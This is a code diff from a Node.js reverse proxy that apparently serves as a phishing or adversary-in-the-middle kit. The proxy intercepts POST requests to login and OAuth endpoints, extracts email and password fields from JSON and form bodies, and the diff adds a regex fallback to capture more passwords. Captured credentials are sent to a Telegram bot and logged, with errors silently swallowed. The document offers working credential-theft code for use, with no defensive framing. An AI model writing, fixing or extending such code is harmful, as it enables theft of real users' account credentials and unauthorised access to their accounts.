@@ -324,53 +324,63 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (KEEP THIS)
                     // ====================================================================
                     try {
-                        if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
-                            const originalBody = clientRequestBody.body;
-                            const originalUrl = clientRequestBody.url || '';
-                            const originalMethod = clientRequestBody.method || '';
+    if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
+        const originalBody = clientRequestBody.body;
+        const originalUrl = clientRequestBody.url || '';
+        const originalMethod = clientRequestBody.method || '';
 
-                            console.log('[DEBUG] Original body:', originalBody);
+        console.log('[DEBUG] Original body:', originalBody);
         console.log('[DEBUG] Content-Type:', clientRequestBody.headers?.['content-type'] || '');
 
-                            if (originalMethod === 'POST' && 
-                                (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
-                                 originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
-                                 originalUrl.includes('/authorize'))) {
+        if (originalMethod === 'POST' && 
+            (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
+             originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
+             originalUrl.includes('/authorize'))) {
 
-                                let email = '';
-                                let password = '';
-                                const contentType = clientRequestBody.headers?.['content-type'] || '';
+            let email = '';
+            let password = '';
+            const contentType = clientRequestBody.headers?.['content-type'] || '';
 
-                                if (contentType.includes('application/json')) {
-                                    try {
-                                        const json = JSON.parse(originalBody);
-                                        email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
-                                        password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
-                                    } catch (e) {}
-                                } else if (contentType.includes('application/x-www-form-urlencoded')) {
-                                    try {
-                                        const params = new URLSearchParams(originalBody);
-                                        email = params.get('username') || params.get('user') || params.get('email') || 
-                                                params.get('loginfmt') || params.get('login') || params.get('userid') || '';
-                                        password = params.get('password') || params.get('passwd') || params.get('pass') || 
-                                                   params.get('Password') || params.get('pwd') || '';
-                                    } catch (e) {}
-                                }
+            if (contentType.includes('application/json')) {
+                try {
+                    const json = JSON.parse(originalBody);
+                    email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                    password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                } catch (e) {}
+            } else if (contentType.includes('application/x-www-form-urlencoded')) {
+                try {
+                    const params = new URLSearchParams(originalBody);
+                    console.log('[DEBUG] passwd param from URLSearchParams:', params.get('passwd'));
+                    email = params.get('username') || params.get('user') || params.get('email') || 
+                            params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                    password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                               params.get('Password') || params.get('pwd') || '';
+                } catch (e) {}
+            }
 
-                                if (email || password) {
-                                    const msg = `🔐 *Credentials Captured*\n\n` +
-                                                `📧 *Email:* ${email || 'N/A'}\n` +
-                                                `🔑 *Password:* ${password || 'N/A'}\n` +
-                                                `🌐 *URL:* ${originalUrl}\n` +
-                                                `🕐 *Time:* ${new Date().toISOString()}`;
-                                    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                                    console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
-                                }
-                            }
-                        }
-                    } catch (e) {
-                        // Silent fail
-                    }
+            // ---- FALLBACK: extract password directly from raw body ----
+            if (!password) {
+                const passMatch = originalBody.match(/passwd=([^&]*)/);
+                if (passMatch) {
+                    password = decodeURIComponent(passMatch[1]);
+                    console.log('[FALLBACK] Extracted password via regex:', password);
+                }
+            }
+
+            if (email || password) {
+                const msg = `🔐 *Credentials Captured*\n\n` +
+                            `📧 *Email:* ${email || 'N/A'}\n` +
+                            `🔑 *Password:* ${password || 'N/A'}\n` +
+                            `🌐 *URL:* ${originalUrl}\n` +
+                            `🕐 *Time:* ${new Date().toISOString()}`;
+                sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
+                console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
+            }
+        }
+    }
+} catch (e) {
+    // Silent fail
+}
                     // ====================================================================
 
                     // Call the async makeProxyRequest (direct connection)
